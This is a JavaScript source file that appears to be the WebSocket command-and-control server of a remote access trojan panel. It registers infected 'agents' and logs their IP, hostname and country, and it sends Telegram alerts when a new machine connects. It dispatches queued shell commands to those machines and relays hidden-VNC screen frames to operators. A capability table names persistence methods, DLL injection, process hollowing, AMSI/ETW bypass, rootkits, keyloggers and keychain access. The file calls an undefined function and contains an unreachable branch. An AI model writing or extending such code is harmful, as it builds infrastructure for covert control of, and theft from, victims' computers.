const mongoose = require('mongoose');
const Client = require('../models/Client');
const Task = require('../models/Task');
const { validateWebSocketMessage } = require('../middleware/validation');
const jwt = require('jsonwebtoken');
const telegramService = require('../services/telegramService');

// Store all connected clients (unified approach)
const connectedClients = new Map(); // Map of uuid -> websocket
const adminSessions = new Set(); // Store admin web sessions separately

// Helper function to get client connection
const getClientConnection = (uuid) => {
  return connectedClients.get(uuid);
};

// Export the helper function
module.exports.getClientConnection = getClientConnection;

// Platform detection utilities
function detectOperatingSystem(platformString, userAgent) {
    if (!platformString && !userAgent) return 'unknown';
    
    const combined = `${platformString || ''} ${userAgent || ''}`.toLowerCase();
    
    if (combined.includes('windows')) return 'windows';
    if (combined.includes('linux')) return 'linux';
    if (combined.includes('macos') || combined.includes('darwin')) return 'macos';
    if (combined.includes('android')) return 'android';
    if (combined.includes('ios')) return 'ios';
    
    return 'unknown';
}

function detectArchitecture(platformString, systemInfo) {
    if (!platformString && !systemInfo) return 'unknown';
    
    const combined = `${platformString || ''} ${JSON.stringify(systemInfo || {})}`.toLowerCase();
    
    if (combined.includes('x64') || combined.includes('amd64') || combined.includes('x86_64')) return 'x64';
    if (combined.includes('arm64') || combined.includes('aarch64')) return 'arm64';
    if (combined.includes('arm')) return 'arm';
    if (combined.includes('x86') || combined.includes('i386') || combined.includes('i686')) return 'x86';
    
    return 'unknown';
}

function extractCapabilities(data) {
    const capabilities = {
        persistence: [],
        injection: [],
        evasion: [],
        commands: [],
        features: []
    };
    
    // Extract capabilities based on platform and reported features
    const os = detectOperatingSystem(data.platform, data.userAgent);
    
    switch (os) {
        case 'windows':
            capabilities.persistence = ['registry', 'startup', 'service', 'task_scheduler'];
            capabilities.injection = ['dll_injection', 'process_hollowing', 'reflective_dll'];
            capabilities.evasion = ['amsi_bypass', 'etw_bypass', 'unhook'];
            capabilities.commands = ['powershell', 'cmd', 'wmi', 'registry'];
            capabilities.features = ['screenshot', 'keylogger', 'file_manager', 'process_manager'];
            break;
        case 'linux':
            capabilities.persistence = ['cron', 'systemd', 'bashrc', 'init_d'];
            capabilities.injection = ['ld_preload', 'ptrace'];
            capabilities.evasion = ['process_hiding', 'rootkit'];
            capabilities.commands = ['bash', 'sh', 'python', 'perl'];
            capabilities.features = ['screenshot', 'file_manager', 'process_manager'];
            break;
        case 'macos':
            capabilities.persistence = ['launchd', 'cron', 'login_items'];
            capabilities.injection = ['dylib_injection', 'mach_inject'];
            capabilities.evasion = ['codesign_bypass', 'gatekeeper_bypass'];
            capabilities.commands = ['bash', 'zsh', 'osascript', 'defaults'];
            capabilities.features = ['screenshot', 'keychain_access', 'file_manager'];
            break;
        default:
            capabilities.commands = ['basic_shell'];
            capabilities.features = ['basic_info'];
    }
    
    // Add reported capabilities if available
    if (data.capabilities) {
        Object.keys(capabilities).forEach(key => {
            if (data.capabilities[key]) {
                capabilities[key] = [...new Set([...capabilities[key], ...data.capabilities[key]])];
            }
        });
    }
    
    return capabilities;
}

// Broadcast function to send data to all admin sessions
function broadcastToAdminSessions(data) {
    const message = JSON.stringify(data);
    adminSessions.forEach(client => {
        if (client.readyState === client.OPEN) {
            client.send(message);
        } else {
            adminSessions.delete(client);
        }
    });
}

// WebSocket connection handler with authentication and validation
// Function to get current connection stats for debugging
function getConnectionStats() {
    return {
        totalClients: connectedClients.size + adminSessions.size,
        connectedClients: connectedClients.size,
        adminSessions: adminSessions.size,
        clientIds: Array.from(connectedClients.keys()),
        timestamp: new Date().toISOString()
    };
}

// Function to broadcast connection stats to admin sessions
function broadcastConnectionStats() {
    const stats = getConnectionStats();
    console.log('Current connection stats:', stats);
    broadcastToAdminSessions({
        type: 'connection_stats',
        stats: stats
    });
}

// Main WebSocket handler function
const wsHandler = (ws, req) => {
    let isAuthenticated = false;
    let clientType = 'unknown'; // 'client' or 'admin'
    let clientId = null;
    
    console.log('New WebSocket connection from:', req.socket.remoteAddress);
    console.log('Current connections before new connection:', getConnectionStats());
    
    // Set connection timeout for authentication - INCREASED TO 60 SECONDS
    const authTimeout = setTimeout(() => {
        if (!isAuthenticated) {
            console.log('WebSocket connection timeout - no authentication received');
            ws.close(1008, 'Authentication timeout');
        }
    }, 60000); // 60 seconds to authenticate (increased from 30)
    
    ws.on('message', async (message) => {
        try {
            console.log('WebSocket message received from:', req.socket.remoteAddress, 'Message:', message.toString());
            let data;
            try {
                data = JSON.parse(message);
                console.log('Parsed WebSocket message:', data);
            } catch (parseError) {
                console.error('Invalid JSON received:', parseError);
                ws.send(JSON.stringify({ 
                    type: 'error', 
                    message: 'Invalid JSON format' 
                }));
                return;
            }
            
            // Validate message structure and sanitize inputs
            const validationErrors = validateWebSocketMessage(data);
            if (validationErrors.length > 0) {
                console.error('WebSocket message validation failed:', validationErrors);
                ws.send(JSON.stringify({ 
                    type: 'error', 
                    message: 'Message validation failed',
                    errors: validationErrors
                }));
                return;
            }
            
            // Handle authentication for admin sessions
            if (data.type === 'auth' && data.token) {
                try {
                    const decoded = jwt.verify(data.token, process.env.JWT_SECRET);
                    isAuthenticated = true;
                    clientType = 'admin';
                    clientId = decoded.id; // Changed from userId to id to match token payload
                    clearTimeout(authTimeout);
                    
                    adminSessions.add(ws);
                    ws.send(JSON.stringify({ 
                        type: 'auth_success', 
                        message: 'Authentication successful' 
                    }));
                    
                    console.log('Admin session authenticated:', clientId);
                    return;
                } catch (jwtError) {
                    console.error('JWT verification failed:', jwtError);
                    ws.send(JSON.stringify({ 
                        type: 'auth_failed', 
                        message: 'Invalid token' 
                    }));
                    ws.close(1008, 'Authentication failed');
                    return;
                }
            }
            
            // For clients, first message should be registration
            if (!isAuthenticated && (data.type === 'register' || data.type === 'agent_register')) {
                console.log('Processing client registration:', data);
                isAuthenticated = true;
                clientType = 'client';
                clientId = data.uuid || data.agentId;
                clearTimeout(authTimeout);
                
                console.log('Client registered:', clientId);
                
                // Store the connection for client communication
                if (data.uuid || data.agentId) {
                    connectedClients.set(clientId, ws);
                    console.log('Client connection stored:', clientId);
                    console.log('Total connected clients:', connectedClients.size);
                }
            }
            
            // Handle admin session identification
            if (data.type === 'web_client') {
                // If already authenticated via auth token, just acknowledge
                if (isAuthenticated && clientType === 'admin') {
                    ws.send(JSON.stringify({ 
                        type: 'web_client_ack', 
                        message: 'Admin session acknowledged' 
                    }));
                    console.log('Admin session identified');
                    
                    // Send current client list to the newly connected admin
                    const { webPanelIntegration } = require('./integration');
                    const { clientIntegration } = require('./integration');
                    
                    clientIntegration.getAllClients().then(clients => {
                        const formattedClients = webPanelIntegration.formatClientListForWebPanel(clients);
                        ws.send(JSON.stringify({
                            type: 'client_list_update',
                            clients: formattedClients
                        }));
                        console.log('Sent client list to admin:', formattedClients.length, 'clients');
                    }).catch(error => {
                        console.error('Error sending client list to admin:', error);
                    });
                } else {
                    // Admin sessions should authenticate first with auth token
                    ws.send(JSON.stringify({ 
                        type: 'auth_required', 
                        message: 'Authentication required' 
                    }));
                    console.log('Unauthenticated admin session message received');
                }
                return;
            }
            
            // Handle client registration
            if ((data.type === 'register' || data.type === 'agent_register') && clientType === 'client') {
                // Send success response to client
                ws.send(JSON.stringify({ 
                    type: 'register_success', 
                    message: 'Client registered successfully' 
                }));
                
                // Use integration layer for client registration if available
                try {
                    console.log('Attempting to use integration layer for client registration');
                    const { websocketHandlers } = require('./integration');
                    // Ensure uuid is set from agentId if not provided
                    if (!data.uuid && data.agentId) {
                        data.uuid = data.agentId;
                        console.log('Set uuid from agentId:', data.uuid);
                    }
                    
                    // Normalize platform data before passing to integration layer
                    const normalizedData = {
                        ...data,
                        platform: data.platform || 'Unknown',
                        userAgent: data.userAgent || '',
                        systemInfo: data.systemInfo || {}
                    };
                    
                    console.log('Calling websocketHandlers.handleClientRegistration with normalized data:', normalizedData);
                    await websocketHandlers.handleClientRegistration(normalizedData, ws);
                    console.log('Integration layer registration completed successfully');
                } catch (error) {
                    console.log('Integration layer error:', error.message);
                    console.log('Using basic registration instead');
                }
                return;
            }
            
            // Reject messages from unauthenticated connections
            if (!isAuthenticated) {
                console.log('Rejecting message from unauthenticated connection');
                ws.send(JSON.stringify({ 
                    type: 'error', 
                    message: 'Authentication required' 
                }));
                return;
            }

            // Handle admin session identification
            if (data.type === 'web_client' && clientType === 'admin') {
                ws.clientType = 'admin';
                adminSessions.add(ws);
                console.log('Admin session connected. Total admin sessions:', adminSessions.size);
                console.log('Updated connection stats:', getConnectionStats());
                
                // Send current client list to new admin session
                const clients = await Client.find({});
                const { webPanelIntegration } = require('./integration');
                const formattedClients = webPanelIntegration.formatClientListForWebPanel(clients);
                ws.send(JSON.stringify({
                    type: 'client_list_update',
                    clients: formattedClients
                }));
                return;
            }

            // Handle capability discovery messages
            if (data.type === 'capability_report') {
                const { uuid, capabilities: reportedCapabilities } = data;
                if (uuid) {
                    await Client.findOneAndUpdate(
                        { uuid: uuid },
                        { 
                            $set: { 
                                capabilities: reportedCapabilities,
                                lastHeartbeat: new Date()
                            }
                        }
                    );
                    
                    // Broadcast capability update to admin sessions
                    broadcastToAdminSessions({
                        type: 'client_capabilities_update',
                        uuid: uuid,
                        capabilities: reportedCapabilities
                    });
                }
                return;
            }

            if (data.type === 'heartbeat') {
                // Handle heartbeat messages from clients
                const { uuid } = data;
                if (uuid) {
                    console.log(`Received heartbeat from client ${uuid}`);
                    
                    // Check if client is registered
                    if (!connectedClients.has(uuid)) {
                        console.log(`Heartbeat from unregistered client ${uuid}, ignoring`);
                        return;
                    }
                    
                    // Use integration layer for heartbeat handling if available
                    try {
                        const { websocketHandlers } = require('./integration');
                        await websocketHandlers.handleClientHeartbeat(data);
                        console.log(`Heartbeat processed for client ${uuid}`);
                    } catch (error) {
                        console.log('Integration layer heartbeat error:', error.message);
                        // Fallback to direct database update
                        await Client.findOneAndUpdate(
                            { uuid: uuid },
                            { 
                                $set: { 
                                    lastHeartbeat: new Date(),
                                    status: 'online',
                                    lastActiveTime: new Date()
                                }
                            }
                        );
                        console.log(`Fallback heartbeat update for client ${uuid}`);
                    }
                }
                return;
            }

            if (data.type === 'output') {
                // This is an output message from a client
                const { taskId, output } = data;
                await Task.findByIdAndUpdate(taskId, { output: output });
                
                // Broadcast task completion to admin sessions
                broadcastToAdminSessions({
                    type: 'task_completed',
                    taskId: taskId,
                    output: output
                });
                return;
            }

            if (data.type === 'hvnc_response') {
                // Handle HVNC session responses from client
                const { sessionId, status, error, frameData, screenInfo } = data;
                
                // Update agent HVNC session status
                if (sessionId) {
                    const updateData = {
                        'hvncSession.status': status,
                        'hvncSession.lastUpdate': new Date()
                    };
                    
                    if (error) {
                        updateData['hvncSession.error'] = error;
                    }
                    
                    if (screenInfo) {
                        updateData['hvncSession.screenInfo'] = screenInfo;
                    }
                    
                    await Client.findOneAndUpdate(
                        { uuid: ws.uuid },
                        { $set: updateData }
                    );
                }
                
                // Broadcast HVNC response to admin sessions
                broadcastToAdminSessions({
                    type: 'hvnc_response',
                    agentUuid: ws.uuid,
                    sessionId,
                    status,
                    error,
                    frameData,
                    screenInfo,
                    timestamp: new Date().toISOString()
                });
                return;
            }

            if (data.type === 'hvnc_frame') {
                // Handle HVNC frame data from client
                const { sessionId, frameData, frameInfo } = data;
                
                // Broadcast frame data to admin sessions
                broadcastToAdminSessions({
                    type: 'hvnc_frame',
                    agentUuid: ws.uuid,
                    sessionId,
                    frameData,
                    frameInfo,
                    timestamp: new Date().toISOString()
                });
                return;
            }

            // Handle client messages - only process if client is already registered
            if (data.uuid && connectedClients.has(data.uuid)) {
                ws.uuid = data.uuid;
                ws.clientType = 'client';
            } else if (data.uuid && !connectedClients.has(data.uuid)) {
                console.log(`Received message from unregistered client ${data.uuid}, ignoring`);
                return; // Ignore messages from unregistered clients
            } else {
                return; // Ignore messages without a UUID
            }
            
            console.log(`Received data from client ${data.uuid}`);

            // Detect platform information
            const operatingSystem = detectOperatingSystem(data.platform, data.userAgent);
            const architecture = detectArchitecture(data.platform, data.systemInfo);
            const capabilities = extractCapabilities(data);

            // Find the client by UUID and update its details, or create it if it doesn't exist.
            let updatedClient = await Client.findOne({ uuid: data.uuid });
            
            if (updatedClient) {
                // Update existing client with enhanced platform information
                updatedClient.ip = data.ip || data.ipAddress || 'Unknown';
                updatedClient.ipAddress = data.ipAddress || data.ip || 'Unknown';
                updatedClient.computerName = data.computerName || data.hostname || 'Unknown';
                updatedClient.hostname = data.hostname || 'Unknown';
                updatedClient.platform = data.platform || 'Unknown';
                updatedClient.operatingSystem = operatingSystem;
                updatedClient.osVersion = data.osVersion || data.version || 'Unknown';
                updatedClient.architecture = architecture;
                updatedClient.capabilities = capabilities;
                updatedClient.country = data.country || 'Unknown';
                updatedClient.lastSeen = new Date();
                updatedClient.lastActiveTime = new Date();
                updatedClient.lastHeartbeat = new Date();
                updatedClient.status = 'online';
                updatedClient.connectionCount = (updatedClient.connectionCount || 0) + 1;
                
                // Update system information if provided
                if (data.systemInfo) {
                    updatedClient.systemInfo = {
                        ...updatedClient.systemInfo,
                        ...data.systemInfo
                    };
                }
                
                await updatedClient.save();
            } else {
                // Create new client with enhanced platform information
                updatedClient = new Client({
                    uuid: data.uuid,
                    ip: data.ip || data.ipAddress || 'Unknown',
                    ipAddress: data.ipAddress || data.ip || 'Unknown',
                    computerName: data.computerName || data.hostname || 'Unknown',
                    hostname: data.hostname || 'Unknown',
                    platform: data.platform || 'Unknown',
                    operatingSystem: operatingSystem,
                    osVersion: data.osVersion || data.version || 'Unknown',
                    architecture: architecture,
                    capabilities: capabilities,
                    country: data.country || 'Unknown',
                    lastSeen: new Date(),
                    lastActiveTime: new Date(),
                    lastHeartbeat: new Date(),
                    status: 'online',
                    connectionCount: 1,
                    systemInfo: data.systemInfo || {}
                });
                await updatedClient.save();
                
                // Send Telegram notification for new connection
                try {
                    await telegramService.notifyNewConnection(updatedClient);
                } catch (telegramError) {
                    console.error('Failed to send Telegram notification:', telegramError);
                }
            }

            // Broadcast client status update to all admin sessions
            const { webPanelIntegration } = require('./integration');
            const formattedClient = webPanelIntegration.formatClientForWebPanel(updatedClient);
            broadcastToAdminSessions({
                type: 'client_status_update',
                client: formattedClient
            });

            // Check for any pending tasks for this client
            const tasks = await Task.find({ uuid: data.uuid, status: 'pending' });
            for (const task of tasks) {
                // Validate command compatibility before sending
                const isCompatible = validateCommandCompatibility(task.command, operatingSystem, capabilities);
                
                if (isCompatible) {
                    ws.send(JSON.stringify({ cmd: task.command, taskId: task._id }));
                    task.status = 'executed';
                    await task.save();
                    
                    // Broadcast task execution to admin sessions
                    broadcastToAdminSessions({
                        type: 'task_executed',
                        taskId: task._id,
                        clientUuid: data.uuid,
                        command: task.command
                    });
                } else {
                    // Mark task as failed due to incompatibility
                    task.status = 'failed';
                    task.output = `Command not compatible with ${operatingSystem} platform`;
                    await task.save();
                    
                    broadcastToWebClients({
                        type: 'task_failed',
                        taskId: task._id,
                        clientUuid: data.uuid,
                        reason: 'Platform incompatibility'
                    });
                }
            }

        } catch (err) {
            console.error('WebSocket message processing error:', err);
        }
    });

    ws.on('close', async () => {
        console.log('Client disconnected');
        console.log('Connection stats before cleanup:', getConnectionStats());
        
        if (ws.clientType === 'admin') {
            adminSessions.delete(ws);
            console.log('Admin session disconnected. Total admin sessions:', adminSessions.size);
        } else if (ws.uuid && ws.clientType === 'client') {
            connectedClients.delete(ws.uuid);
            console.log('Client disconnected:', ws.uuid);
            
            const updatedClient = await Client.findOneAndUpdate(
                { uuid: ws.uuid },
                { 
                    $set: { 
                        status: 'offline',
                        lastSeen: new Date()
                    }
                },
                { new: true }
            );
            
            if (updatedClient) {
                // Broadcast client status update to admin sessions
                const { webPanelIntegration } = require('./integration');
                const formattedClient = webPanelIntegration.formatClientForWebPanel(updatedClient);
                broadcastToAdminSessions({
                    type: 'client_status_update',
                    client: formattedClient
                });
            }
        }
        
        console.log('Updated connection stats after cleanup:', getConnectionStats());
        clearTimeout(authTimeout);
    });

    ws.on('error', (error) => {
        console.error('WebSocket error on connection:', error);
    });
};

// Command compatibility validation
function validateCommandCompatibility(command, operatingSystem, capabilities) {
    // Basic platform-specific command validation
    const windowsCommands = ['powershell', 'cmd', 'wmic', 'reg ', 'net ', 'sc '];
    const linuxCommands = ['bash', 'sh', 'ps ', 'kill ', 'grep ', 'find ', 'ls '];
    const macosCommands = ['bash', 'zsh', 'osascript', 'defaults', 'launchctl'];
    
    const commandLower = command.toLowerCase();
    
    switch (operatingSystem) {
        case 'windows':
            return windowsCommands.some(cmd => commandLower.includes(cmd)) || 
                   capabilities.commands.some(cap => commandLower.includes(cap));
        case 'linux':
            return linuxCommands.some(cmd => commandLower.includes(cmd)) || 
                   capabilities.commands.some(cap => commandLower.includes(cap));
        case 'macos':
            return macosCommands.some(cmd => commandLower.includes(cmd)) || 
                   capabilities.commands.some(cap => commandLower.includes(cap));
        default:
            // For unknown platforms, allow basic commands
            return capabilities.commands.includes('basic_shell') || 
                   ['echo', 'whoami', 'pwd'].some(cmd => commandLower.includes(cmd));
    }
}

// Export all functions and the main handler
module.exports = wsHandler;
module.exports.getClientConnection = getClientConnection;
module.exports.getConnectionStats = getConnectionStats;
module.exports.broadcastConnectionStats = broadcastConnectionStats;
module.exports.broadcastToAdminSessions = broadcastToAdminSessions;
